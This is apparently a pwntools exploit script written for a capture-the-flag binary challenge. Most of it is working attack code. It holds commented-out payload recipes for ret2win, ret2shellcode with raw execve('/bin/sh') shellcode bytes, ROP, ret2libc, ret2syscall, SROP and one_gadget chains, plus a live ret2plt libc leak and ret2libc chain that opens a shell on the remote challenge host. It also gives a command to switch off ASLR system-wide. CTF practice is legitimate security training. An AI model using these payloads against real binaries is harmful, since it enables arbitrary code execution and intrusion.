#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.n00bzunit3d.xyz --port 35932 pwn1
from pwn import *

# Set up pwntools for the correct architecture
elf = context.binary = ELF('./noob/noobpwn2', checksec=True)

# Enable verbose logging so we can see exactly what is being sent (info/debug)
# context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.n00bzunit3d.xyz'
port = int(args.PORT or 35932)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)
    
# Find offset to EIP/RIP for buffer overflows    
def find_ip(payload):
    # Launch process and send payload
    p = process(elf.path, level='warn')
    p.sendlineafter(b'?', payload)
    # Wait for the prcoess to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc) # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
    warn('Located EIP/RIP offset at {a}'.format(a = ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

#ret2win
# offset = find_ip(cyclic(128))
# payload = flat(
#     b'A' * offset,
#     elf.symbols.win
# )

#ret2shellcode
# shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
# payload = shellcode + cyclic(16) + pack(shellcodevar_address)

#rop
# pop_rdi = 
# bin_sh = pwndbg> search /bin/sh
# ret = 
# system = elf.sym.system or pwndbg> p system
# payload = cyclic(40) + pack(pop_rdi) + pack(bin_sh) + pack(ret) + pack(system)

#ASLR off-> 0 | ASLR on-> 2 | To turn off
# $echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

#ret2plt
#this payload prints puts() address
# payload = cyclic(40) + pack(pop_rdi) + pack(elf.got.puts) + pack(elf.sym.puts) + pack(elf.sym.main)
# io.sendline(payload)
#recv leak and calc base
# $ldd ./ret2plt
# $objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep -i puts
# libc = elf.libc
# leak = io.recvlines(2)[1]
# leak_int = unpack(leak, 'all')
# distance = libc.sym.puts
# libc_base = leak_int - distance
# print(hex(libc_base))
#ret2libc
# $strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep -i /bin/sh
# $objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep -i system
# bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
# system = libc_base + libc.sym.system
# payload = cyclic(40) + pack(pop_rdi) + pack(bin_sh) + pack(ret) + pack(system)

#ret2syscall
# pop_rax = 
# pop_rdi = 
# pop_rsi = 
# pop_rdx = 
# syscall = 
# payload = cyclic(8) + pack(pop_rax) + pack(59) + pack(pop_rdi) + pack(bin_sh) + pack(pop_rsi) + pack(0) + pack(pop_rdx) + pack(0) + pack(syscall)

#srop
#uses sigreturn
# pop_rax = 
# syscall = 
# frame = SigreturnFrame()
# frame.rax = 59
# frame.rdi = bin_sh
# frame.rsi = 0
# frame.rdx = 0
# frame.rip = syscall
# payload = cyclic(8) + pack(pop_rax) + pack(15) + pack(syscall) + bytes(frame)

#ret2csu
#after first payload and calculating libc_base from ret2plt
# payload = cyclic(56) + pack(libc_base + one_gadget)

#Example
pop_rdi = 0x401196
ret = 0x40101a
io.sendline(b'a')
payload = cyclic(40) + pack(pop_rdi) + pack(elf.got.puts) + pack(elf.sym.puts) + pack(elf.sym.main)
io.sendline(payload)

libc = elf.libc
leak = io.recvlines(6)[-1]
print("The leaked data is:" + str(leak))
leak_int = unpack(leak, 'all')
libc_base = leak_int - libc.sym.puts
print(hex(libc_base))
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
system = libc_base + libc.sym.system

# return to system
io.sendline(b'a')
payload = cyclic(40) + pack(pop_rdi) + pack(bin_sh) + pack(ret) + pack(system)
io.sendline(payload)
io.interactive()
